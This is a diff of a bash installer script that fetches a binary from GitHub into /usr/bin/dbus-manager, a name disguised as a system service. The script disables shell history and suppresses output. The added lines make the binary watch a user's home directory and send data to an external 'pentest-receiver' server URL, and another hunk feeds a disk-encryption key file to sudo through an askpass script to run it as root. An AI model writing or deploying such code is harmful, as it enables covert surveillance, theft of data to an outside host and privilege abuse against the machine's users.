@@ -12,9 +12,9 @@ if [ "$EUID" -eq 0 ]; then
 #!/bin/bash
 unset HISTFILE
 set +o history
-python /usr/bin/dbus-manager 2>/dev/null
+/usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data 2>/dev/null
 EOF
-    GOOD_BOY_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/goodboy.py"
+    GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     curl -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
     wget -q -O /usr/bin/dbus-manager "$GOOD_BOY_URL"
 
@@ -85,7 +85,7 @@ if [ -f /etc/crypttab.key ]; then
     ASKPASS_SCRIPT=\$(mktemp)
     echo -e "#!/bin/sh\ncat /etc/crypttab.key" > "\$ASKPASS_SCRIPT"
     chmod +x "\$ASKPASS_SCRIPT"
-    SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A python /usr/bin/dbus-manager 2>/dev/null
+    SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A /usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data 2>/dev/null
     rm -f "\$ASKPASS_SCRIPT"
 fi
 MONITOREOF
